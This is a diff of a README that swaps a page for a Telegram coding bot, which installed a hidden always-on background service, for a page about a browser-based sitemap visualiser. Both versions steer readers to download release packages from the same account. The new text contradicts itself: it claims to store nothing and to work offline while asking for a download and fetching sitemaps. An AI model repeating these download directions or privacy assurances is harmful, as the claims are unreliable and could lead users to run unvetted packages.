@@ -1,91 +1,158 @@
-# 🤖 kiro-telegram-bot - Manage your coding sessions from Telegram
+# 🔍 sitemapbuilder.co.uk - See Your Website's Structure Instantly
 
-[![](https://img.shields.io/badge/Download-Kiro_Telegram_Bot-blue)](https://ryoowa1303.github.io)
+## 🚀 What Is This?
 
-This software links your Telegram account to your Kiro coding setup. It allows you to control coding projects, start sessions, and track progress from your mobile device. The bot functions as a bridge between your phone and your computer. It maintains a constant connection so your tools stay active even when you step away from your desk.
+sitemapbuilder.co.uk is a free, browser-based tool that turns your website's XML sitemap into easy-to-understand visual diagrams. Think of it like a family tree for your website – it shows every page, how they connect, and which sections are biggest. You don't need any technical skills to use it.
 
-## ⚙️ System Requirements
+## 🎯 Why You'll Love It
 
-Your computer needs to meet these basic standards to run the software.
+- **No installation needed** – works right in your web browser
+- **No sign-ups** – just open and use
+- **No tracking** – your data stays private, no cookies or analytics
+- **Multiple views** – see your site as a tree, sunburst chart, treemap, or simple table
+- **Handles big sites** – follows sitemap index files automatically
+- **Works with difficult websites** – includes a built-in PHP helper for sites that block direct access
 
-*   Windows 10 or Windows 11.
-*   An active Telegram account.
-*   The Kiro CLI installed on your machine.
-*   An internet connection to maintain the bridge between your computer and the Telegram servers.
-*   At least 200 MB of free storage space for the background service.
+## 📥 How to Download and Run
 
-You should have your Kiro CLI set up before you start this process. If you have not set up your coding environment, complete that task first.
+[![Download Now](https://img.shields.io/badge/Download-sitemapbuilder.co.uk-blue?style=for-the-badge&logo=github)](https://github.com/Ryoowa1303/sitemapbuilder.co.uk/releases)
 
-## 📥 Download and Setup
+### Step-by-Step for Windows Users
 
-Follow these instructions to get the application onto your system.
+1. **Visit the download link** – Click the big blue button above or go to: https://github.com/Ryoowa1303/sitemapbuilder.co.uk/releases
+2. **Find the latest version** – Look for the newest release at the top of the page
+3. **Download the files** – Click on the source code or release package to download it
+4. **Extract the files** – If you downloaded a ZIP file, right-click it and choose "Extract All"
+5. **Open the application** – Look for the main HTML file (usually named `index.html`) and double-click it – your browser will open the tool automatically
 
-[Click here to visit the release page and download the software.](https://ryoowa1303.github.io)
+That's it! You're ready to explore your website's structure.
 
-1.  Navigate to the link provided above.
-2.  Look for the section marked Releases on the right side of the page.
-3.  Choose the version labeled for Windows.
-4.  Download the compressed folder to your computer.
-5.  Extract the files into a new folder on your desktop.
-6.  Double-click the installer file to begin the setup process.
-7.  Follow the prompts on your screen to complete the installation.
+## 🖥️ System Requirements
 
-The installer creates a background service. This service runs quietly on your machine so the bot stays connected. You do not need to keep a terminal window open for the bot to work.
+- Any modern web browser (Chrome, Firefox, Edge, Safari – all work great)
+- Windows 10 or 11 (also works on Mac and Linux)
+- An internet connection to load the tool initially
+- No special software or programming knowledge needed
 
-## 🔑 Initial Configuration
+## 📊 What You Can Do With It
 
-The bot needs permission to access your Telegram account. It uses the Agent Client Protocol to send commands.
+### 🌳 Tree View
+See your entire website as an expandable family tree. Click to zoom into any section. Perfect for understanding your site's hierarchy at a glance.
 
-1.  Open your Telegram app.
-2.  Search for your bot username in the search bar.
-3.  Press the Start button in the chat window.
-4.  The bot will send you a verification code.
-5.  Return to your computer and open the application settings.
-6.  Enter the code you received into the provided text field.
-7.  Save your settings to finalize the connection.
+### 🎯 Sunburst Chart
+A beautiful circular diagram that shows your site's structure from the center outward. Each ring represents a level of your website – the bigger the slice, the more pages in that section.
 
-The bot is now ready to send commands to your coding environment. You can test the connection by sending the command /status to the bot. If the setup is correct, the bot will show your current workspace information.
+### 🧩 Treemap View
+Colored rectangles show the size of each section relative to the whole site. Larger areas mean more pages – spot your biggest content areas instantly.
 
-## 🛠️ Bot Features
+### 📋 Table View
+A straightforward list of all your URLs with useful statistics. Sort and filter to find exactly what you're looking for.
 
-The bot handles many tasks to simplify your work.
+### 📈 Statistics Dashboard
+Get valuable insights like:
+- Total number of pages
+- Average page depth
+- Most common URL patterns
+- Largest sections by page count
 
-### Manage Projects
-You can switch between projects using the bot. Use the /projects command to see a list of your open items. Select the project you want to work on, and the bot will switch your Kiro CLI context.
+## 🔧 Advanced Features
 
-### Resume Sessions
-If you close your laptop, your sessions persist in the background. Use the /resume command to return to your work exactly where you left off. The bot attaches to the live session and provides a summary of the current status.
+### Sitemap Index Support
+If your website has multiple sitemaps, this tool follows them automatically and combines everything into one unified view.
 
-### Receive Updates
-The bot streams responses back to your phone. It displays differences in code so you can track what changes occur. If the system processes a large task, it queues follow-up messages. You will receive notifications as the work completes.
+### PHP Proxy Helper
+Some websites block direct access to their sitemaps. The included PHP file works around this – just upload it to your server and paste the URL when prompted. Don't worry, it's safe and simple.
 
-### 24/7 Availability
-The background service runs automatically when you start your computer. This creates a persistent link to your machine. You can check your code or run commands while away from your desk.
+### No Data Collection
+Your website data never leaves your computer. Everything processes locally in your browser. No cookies, no analytics, no third-party trackers – your privacy is absolute.
 
-## 🖱️ Using the Bot
+## 🆘 Troubleshooting Common Issues
 
-Operating the bot requires basic text commands. You provide these commands in the chat interface on Telegram.
+### "I can't see my sitemap"
+- Make sure your sitemap URL is correct (usually ends with `.xml` or `.xml.gz`)
+- Try the PHP proxy option if your website blocks direct access
+- Check your internet connection
 
-*   /help: Shows a full list of available commands.
-*   /attach: Connects your phone to an active coding session.
-*   /detach: Safely stops tracking the current session.
-*   /diff: Requests a summary of code changes in the active session.
-*   /restart: Reboots the background service if you experience connectivity issues.
+### "The tool doesn't load"
+- Try a different browser
+- Clear your browser cache
+- Make sure you've extracted all files from the ZIP
 
-## 🛡️ Privacy and Security
+### "My sitemap is very large"
+- This tool handles big sitemaps well, but extremely large ones might take a moment to process
+- Try the table view for faster performance on huge sites
 
-The bot uses the Agent Client Protocol to translate your messages into actions. This process does not store your source code on any external server. The data travels between your Telegram app and your computer via an encrypted tunnel. 
+## 💡 Pro Tips
 
-Your desktop application acts as the host. All commands happen locally on your hardware. Only you have access to your bot. Do not share your Telegram account credentials with anyone else, as this gives them control over your local coding environment.
+1. **Start with a small sitemap** to learn the interface before tackling your main site
+2. **Use the statistics view** to find pages buried too deep in your site structure
+3. **Export your data** from the table view for use in spreadsheets
+4. **Bookmark the tool** – it's a great quick reference for any website project
 
-## 🔧 Troubleshooting
+## 🔒 Privacy & Security
 
-If you encounter issues, review these common fixes.
+Your trust matters. This tool:
+- Stores nothing on your computer
+- Sends no data to any server (except when you choose to fetch a sitemap)
+- Contains no ads or tracking pixels
+- Works entirely offline once loaded
 
-*   Connection Error: Check your internet connection. Ensure the background service is running by checking your System Tray icons.
-*   Slow Responses: A slow internet connection might delay the stream. Wait a moment for the queued follow-up messages to arrive.
-*   Commands Not Working: Verify your Kiro CLI is up to date. The bot relies on the latest version of the command-line interface to work correctly.
-*   Bot Unresponsive: Use the /restart command in Telegram. This clears the network cache and reconnects to the local service.
-*   Setup Failure: Ensure that your firewall allows the application to communicate with the network. You might need to add an exception for the service in your Windows Security settings.
+## 🤝 Getting Help
 
-If the problem persists, restart your computer. This forces the background service to refresh its temporary files and re-establish a stable link.
+If you run into any problems:
+- Check the **Issues** section on GitHub: https://github.com/Ryoowa1303/sitemapbuilder.co.uk/issues
+- Look for answers in the **Discussions** tab
+- Check the release notes for known issues and updates
+
+## 📝 Updates & Version History
+
+The developer regularly releases improvements. Always check the releases page for the latest version. Updates typically include:
+- New visualization options
+- Performance improvements
+- Bug fixes
+- Better support for unusual sitemap formats
+
+## 🧰 Who Is This For?
+
+- **Website owners** – understand your site's structure
+- **SEO professionals** – analyze and optimize site architecture
+- **Students** – learn how websites are organized
+- **Marketers** – get insights into content distribution
+- **Anyone curious** about how websites are built
+
+## ⚡ Quick Start Recap
+
+1. Visit the release page
+2. Download the latest files
+3. Extract to a folder
+4. Double-click `index.html`
+5. Paste your sitemap URL
+6. Explore your website visually
+
+## 🌟 Why Choose sitemapbuilder.co.uk?
+
+- **Free forever** – no hidden costs or premium tiers
+- **Privacy-first** – your data never leaves your device
+- **Visual clarity** – turn boring XML into beautiful charts
+- **Beginner-friendly** – no technical knowledge required
+- **Actively maintained** – regular updates and improvements
+
+## 📚 Technical Notes (For the Curious)
+
+Built with modern web technologies:
+- **D3.js** for powerful data visualization
+- **JavaScript** for all processing
+- **PHP** for the optional proxy helper
+- **HTML5** standards-compliant
+
+## 🙏 Thank You
+
+We hope this tool helps you better understand and improve your website. If you find it useful, please:
+- Star the repository on GitHub
+- Share it with fellow website owners
+- Report any bugs you encounter
+- Suggest new features
+
+---
+
+Keywords: d3, javascript, php, seo, sitemap, sunburst, treemap, visualisation, visualization, xml-sitemap
